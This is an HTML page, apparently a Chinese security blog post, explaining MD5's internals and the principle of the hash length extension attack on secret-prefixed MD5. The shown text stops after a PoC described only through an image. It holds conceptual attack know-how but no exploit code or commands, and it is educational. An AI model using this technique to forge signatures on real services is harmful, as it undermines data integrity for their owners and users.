@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ciphersaw.me","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x00 前言Hash Length Extension Attack（哈希长度扩展攻击）是针对采用了 Merkle–Damgård 结构的哈希函数的攻击手段，如 MD5、SHA-1 和 SHA-2 等。该攻击可以伪造消息散列值，产生新的合法数字签名，对数据的完整性和不可否认性造成严重威胁。 本文以 MD5 为例，0x01 介绍 MD5 的基本原理；0x02 介绍 Hash Length Exte">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hash Length Extension Attack（哈希长度扩展攻击）">
+<meta property="og:url" content="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/index.html">
+<meta property="og:site_name" content="Secrypt Agency">
+<meta property="og:description" content="0x00 前言Hash Length Extension Attack（哈希长度扩展攻击）是针对采用了 Merkle–Damgård 结构的哈希函数的攻击手段，如 MD5、SHA-1 和 SHA-2 等。该攻击可以伪造消息散列值，产生新的合法数字签名，对数据的完整性和不可否认性造成严重威胁。 本文以 MD5 为例，0x01 介绍 MD5 的基本原理；0x02 介绍 Hash Length Exte">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/md5-process.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example1.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example2.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/iteration.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/step-function.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/poc.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-question.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-input.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source1.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-cookie.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-source2.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-hashpump.jpg">
+<meta property="og:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/lmi-flag.jpg">
+<meta property="article:published_time" content="2017-11-12T01:22:34.000Z">
+<meta property="article:modified_time" content="2021-10-01T02:06:53.564Z">
+<meta property="article:author" content="Cipher Saw">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Audit">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="Vulnerability">
+<meta property="article:tag" content="实验吧">
+<meta property="article:tag" content="MD5">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/md5-process.jpg">
+
+
+<link rel="canonical" href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://ciphersaw.me/2017/11/12/hash-length-extension-attack/","path":"2017/11/12/hash-length-extension-attack/","title":"Hash Length Extension Attack（哈希长度扩展攻击）"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hash Length Extension Attack（哈希长度扩展攻击） | Secrypt Agency</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Secrypt Agency</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to a platform for network security artists.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-users fa-fw"></i>Friends</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-MD5-Hash-Function"><span class="nav-text">0x01 MD5 Hash Function</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-1-%E9%99%84%E5%8A%A0%E5%A1%AB%E5%85%85"><span class="nav-text">Step 1 附加填充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-2-%E5%88%9D%E5%A7%8B%E9%93%BE%E6%8E%A5%E5%8F%98%E9%87%8F"><span class="nav-text">Step 2 初始链接变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-3-%E5%88%86%E7%BB%84%E5%8D%95%E5%85%83%E8%BF%AD%E4%BB%A3%E5%8E%8B%E7%BC%A9"><span class="nav-text">Step 3 分组单元迭代压缩</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Step-4-%E6%AD%A5%E5%87%BD%E6%95%B0"><span class="nav-text">Step 4 步函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Hash-Length-Extension-Attack"><span class="nav-text">0x02 Hash Length Extension Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-HashPump"><span class="nav-text">0x03 HashPump</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-writeups"><span class="nav-text">0x04 writeups</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90%E5%AE%9E%E9%AA%8C%E5%90%A7-CTF%E3%80%91-Web-%E2%80%94%E2%80%94-%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BB"><span class="nav-text">【实验吧 CTF】 Web —— 让我进去</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cipher Saw"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Cipher Saw</p>
+  <div class="site-description" itemprop="description">Not to be whom you don't want to be.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">74</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ciphersaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ciphersaw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/CipherSaw" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;CipherSaw" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe-asia fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctf-wiki.github.io/ctf-wiki/" title="https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;" rel="noopener" target="_blank">CTF Wiki</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.owasp.org/index.php/Main_Page" title="https:&#x2F;&#x2F;www.owasp.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">OWASP</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.pentest-standard.org/index.php/Main_Page" title="http:&#x2F;&#x2F;www.pentest-standard.org&#x2F;index.php&#x2F;Main_Page" rel="noopener" target="_blank">Pentest Standard</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/ciphersaw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Cipher Saw">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secrypt Agency">
+      <meta itemprop="description" content="Not to be whom you don't want to be.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hash Length Extension Attack（哈希长度扩展攻击） | Secrypt Agency">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hash Length Extension Attack（哈希长度扩展攻击）
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-11-12 09:22:34" itemprop="dateCreated datePublished" datetime="2017-11-12T09:22:34+08:00">2017-11-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-10-01 10:06:53" itemprop="dateModified" datetime="2021-10-01T10:06:53+08:00">2021-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/InfoSec/" itemprop="url" rel="index"><span itemprop="name">InfoSec</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/InfoSec/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2017/11/12/hash-length-extension-attack/" class="post-meta-item leancloud_visitors" data-flag-title="Hash Length Extension Attack（哈希长度扩展攻击）" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Length_extension_attack">Hash Length Extension Attack</a>（<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB">哈希长度扩展攻击</a>）</strong>是针对采用了 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction">Merkle–Damgård 结构</a>的哈希函数的攻击手段，如 MD5、SHA-1 和 SHA-2 等。该攻击可以伪造消息散列值，产生新的合法数字签名，对数据的完整性和不可否认性造成严重威胁。</p>
+<p>本文以 MD5 为例，0x01 介绍 MD5 的基本原理；0x02 介绍 Hash Length Extension Attack 的漏洞原理与漏洞修复方法，并在假设场景下展示了漏洞利用过程；0x03 介绍攻击工具 HashPump 的使用；0x04 借助相关的 CTF 题目来展示此漏洞的利用方法。</p>
+<p>阅读本文需要<strong>理解 MD5 哈希函数的原理</strong>，以及<strong>在 Linux 下熟练使用命令行工具</strong>。</p>
+<span id="more"></span>
+
+<h1 id="0x01-MD5-Hash-Function"><a href="#0x01-MD5-Hash-Function" class="headerlink" title="0x01 MD5 Hash Function"></a>0x01 MD5 Hash Function</h1><p>为了后续更好地理解 Hash Length Extension Attack，首先简单介绍一下 MD5 的算法流程。</p>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/MD5">MD5</a> 算法由美国麻省理工密码学家 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ron_Rivest">Ronald Rivest</a> 在 MD2、MD3 与 MD4 的基础上设计而成，并在 1992 年公开发表，在规范 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC 1321</a> 中作了详尽阐述。</p>
+<p>MD5 算法的输入为长度小于 $2^{64} \ bit$ 的消息比特串，输出为固定 $128 \ bit$ 的消息散列值，输入数据需要以 $512 \ bit$ 为单位进行分组。</p>
+<p>MD5 算法的流程图如下：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/md5-process.jpg" alt="md5-process"></p>
+<ul>
+<li><p>$L$ 是消息比特串的原始长度；</p>
+</li>
+<li><p>$N$ 是消息扩充后的分组个数；</p>
+</li>
+<li><p>$M_i$ 是消息扩充后的第 $i$ 个分组，$0 \le i \le N-1$；</p>
+</li>
+<li><p>$IV$ 是 $128 \ bit$ 的初始链接变量，由 4 个 $32 \ bit$ 的寄存器构成；</p>
+</li>
+<li><p>$CV_i$ 是链接变量，代表 $M_i$ 分组单元的输入，也是 $M_{i-1}$ 分组单元的输出，$1 \le i \le N-1$。<strong>注意，最后一个分组单元 $M_{N-1}$ 的输出 $CV_N$ 即为消息的散列值。</strong></p>
+</li>
+</ul>
+<p>MD5 算法的具体流程描述如下：</p>
+<h2 id="Step-1-附加填充"><a href="#Step-1-附加填充" class="headerlink" title="Step 1 附加填充"></a>Step 1 附加填充</h2><p>先填充一个「1」比特和若干个「0」比特使消息长度在模 512 下与 448 同余，再将消息的原始长度用一个 $64 \ bit$ 的整型表示，以<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Endianness#Little">小端字节序（Little-Endian）</a>的方式继续填充，使得扩充后的消息长度为 $512 \ bit$ 的整数倍，可表示为：</p>
+<p>$$<br>\begin{cases}<br>L + padding_seq + padding_len &#x3D; N \times 512  \\<br>L + padding_seq \equiv 448 \ mod \ 512  \\<br>\end{cases}<br>$$</p>
+<ul>
+<li>$L$ 是消息比特串的原始长度；</li>
+<li>$padding_seq$ 是比特串「$100 \cdots 00$」的长度；</li>
+<li>$padding_len$ 恒为 $64 \ bit$，代表原始消息长度。</li>
+</ul>
+<p>各自的取值范围如下：</p>
+<p>$$<br>\begin{cases}<br>0 \le L \lt 2^{64}  \\<br>1 \le padding_seq \le 512  \\<br>padding_len &#x3D; 64<br>\end{cases}<br>$$</p>
+<p>下面举例说明，假设要对字符串「hello world」进行附加填充：</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example1.jpg" alt="example1"></p>
+<p>可见消息比特串长度为 $11 \ Byte$，即 $88 \ bit$，因此在第 $89 \ bit$ 处填充「1」比特，然后填充「0」比特直至长度为 $448 \ bit$，而原始长度 $88 \ bit$ 的十六进制为 $0x58 \ bit$，根据小端原则应放在低地址 $0x00000038$ 处，而高地址全部为 $0x00$。</p>
+<p><strong>注意，附加填充对任何消息比特串来说都是必须的，即使消息原始长度恰为 $448 \ bit$：</strong></p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/example2.jpg" alt="example2"></p>
+<p>即使消息比特串长度为 $56 \ Byte$，即 $448 \ bit$，也要在第 $449 \ bit$ 处填充「1」比特，然后填充「0」比特直至下一分组单元长度为 $448 \ bit$，而原始长度 $448 \ bit$ 的十六进制为 $0x01C0 \ bit$，根据小端原则低地址 $0x00000078$ 处为 $0xC0$，$0x00000079$ 处为 $0x01$，而高地址全部为 $0x00$。</p>
+<h2 id="Step-2-初始链接变量"><a href="#Step-2-初始链接变量" class="headerlink" title="Step 2 初始链接变量"></a>Step 2 初始链接变量</h2><p>初始链接变量 $IV$ 在最开始存于 4 个 $32 \ bit$ 的寄存器 $A、B、C、D$ 中，将参与第一个分组单元的哈希运算，它们分别为：</p>
+<p>$$<br>\begin{cases}<br>A &#x3D; 0x01234567  \\<br>B &#x3D; 0x89ABCDEF  \\<br>C &#x3D; 0xFEDCBA98  \\<br>D &#x3D; 0x76543210<br>\end{cases}<br>$$</p>
+<p><strong>注意，这些值都是以小端字节序存放在各个寄存器中，而实际上它们的值为以下 32 位整型数（对于链接变量 $CV_i$ 也同理，注意实际值与内存中存储值的区别）：</strong></p>
+<p>$$<br>\begin{cases}<br>A &#x3D; 0x67452301  \\<br>B &#x3D; 0xEFCDAB89  \\<br>C &#x3D; 0x98BADCFE  \\<br>D &#x3D; 0x10325476<br>\end{cases}<br>$$</p>
+<h2 id="Step-3-分组单元迭代压缩"><a href="#Step-3-分组单元迭代压缩" class="headerlink" title="Step 3 分组单元迭代压缩"></a>Step 3 分组单元迭代压缩</h2><p>每个分组单元 $M_i$ 的迭代压缩由 4 轮组成，将 $512 \ bit$ 的分组单元均分为 16 个子分组参与每轮 16 次的步函数运算，每次步函数的输入为 4 个 $32 \ bit$ 的整型变量和 1 个 $32 \ bit$ 的子分组，输出也为 4 个 $32 \ bit$ 的整型变量，作为下一次步函数的输入。经过 4 轮共 64 次的步函数运算后，将 4 个 $32 \ bit$ 寄存器中的结果分别与相应输入链接变量在模 $2^{32}$ 下相加，即得到该分组单元的输出链接变量。若为最后一个分组，则输出为消息的散列值。</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/iteration.jpg" alt="iteration"></p>
+<p><strong>注意，在第 1 轮开始前，要将输入链接变量 $A、B、C、D$ 的值复制到暂存变量  $AA、BB、CC、DD$ 中，便于 4 轮运算结束后与结果进行模加。</strong></p>
+<h2 id="Step-4-步函数"><a href="#Step-4-步函数" class="headerlink" title="Step 4 步函数"></a>Step 4 步函数</h2><p>MD5 迭代压缩算法每一轮都包含 16 次的步函数运算，同一轮中的步函数使用相同的非线性函数，不同轮之间非线性函数是不同的。设输入 $B、C、D$ 是 3 个 $32 \ bit$ 的整型变量，输出是 1 个 $32 \ bit$ 的整型变量，则每一轮的非线性函数 $F、G、H、I$ 分别定义如下：</p>
+<p>$$<br>\begin{cases}<br>F(B,C,D) &#x3D; (B \land C) \lor (\lnot B \land D)  \\<br>G(B,C,D) &#x3D; (B \land D) \lor (C \land \lnot D)  \\<br>H(B,C,D) &#x3D; B \oplus C \oplus D  \\<br>I(B,C,D) &#x3D; C \oplus (B \lor \lnot D)<br>\end{cases}<br>$$</p>
+<p>其中 $\land、\lor、\lnot、\oplus$ 分别为与、或、非、异或逻辑运算。</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/step-function.jpg" alt="step-function"></p>
+<ul>
+<li>$M[j]$ 表示当前分组单元 $M$ 的第 $j$ 个 $32 \ bit$ 子分组，$0 \le j \le 15$；</li>
+<li>$&lt;&lt;&lt; s$ 表示循环左移 $s$ 位；</li>
+<li>$T[i]$ 是一个伪随机常数，用于消除输入数据的规律性，$1 \le i \le 64$，$i$ 对应着 4 轮共 64 次步函数的执行顺序，其构造方法与具体取值请见规范 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC 1321</a>。</li>
+</ul>
+<p>上图为步函数的具体流程：先取输入整型变量 $B、C、D$ 作为参数执行一次非线性函数，将结果依次加上 $A、M[j]、T[i]$，再将结果循环左移 $s$ 位后加上 $B$，把最终结果赋值给 $B$，而 $B、C、D$ 的输入值依次赋值给 $C、D、A$，得到本次步函数的输出，同时也作为下一次步函数的输入。上述加法运算均在模 $2^{32}$ 下。</p>
+<h1 id="0x02-Hash-Length-Extension-Attack"><a href="#0x02-Hash-Length-Extension-Attack" class="headerlink" title="0x02 Hash Length Extension Attack"></a>0x02 Hash Length Extension Attack</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>Hash Length Extension Attack</strong> 适用于采用了 Merkle–Damgård 结构的哈希函数，攻击者在不知道 $secret$ 具体的值，但知道其长度的情况下，若已知 $message1$ 与 $MD5(secret \ || \ message1)$，可以推算出 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 的值。</p>
+<ul>
+<li>$||$ 是字符串连接符；</li>
+<li>$message1$ 是用户需要计算散列值的明文消息；</li>
+<li>$secret$ 是哈希运算中与明文消息一起计算的私密字符串，相当于消息认证码中的 $key$，或者加「盐」哈希中的 $salt$；</li>
+<li>$padding1$ 是计算 $MD5(secret \ || \ message1)$ 时的附加填充；</li>
+<li>$message2$ 是攻击者构造的任意字符串。</li>
+</ul>
+<p><strong>注意，若要根据 $MD5(secret \ || \ message1)$ 推算 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$，则必须要知道 $secret$ 和 $message1$ 的长度，因为要先计算 $padding1$ 中 $(secret \ || \ message1)$ 的长度，才能得出 $padding2$ 中 $(secret \ || \ message1 || \ padding1 \ || \ message2)$ 的总长度，其中 $padding2$ 是计算 $MD5(secret \ || \ message1 \ || \ padding1 \ || \ message2)$ 时的附加填充。</strong></p>
+<p>道哥在《白帽子讲Web安全》的 <strong><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-27070210-id-3255947.html">Understanding MD5 Length Extension Attack</a></strong> 一文中对此攻击作了详细叙述，本文就其中的 PoC 举例作出讲解。</p>
+<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/hash-length-extension-attack/poc.jpg" alt="poc"></p>
+<p>为了方便说明，上图 PoC 中只有 $secret$，省略了 $message1$。可见，此处的 $secret$ 为随机产生的一个小数字符串，长度为 $18 \ Byte$，即 $144 \ bit$， $MD5(secret)$ 与 $padding1$ 如上图所示，任意值 $message2$ 此处取为「Welcome to Secrypt Agency!」。攻击后得到的散列值与 $MD5(secret \ || \ padding1 \ || \ message2)$ 相等，表示攻击成功。</p>
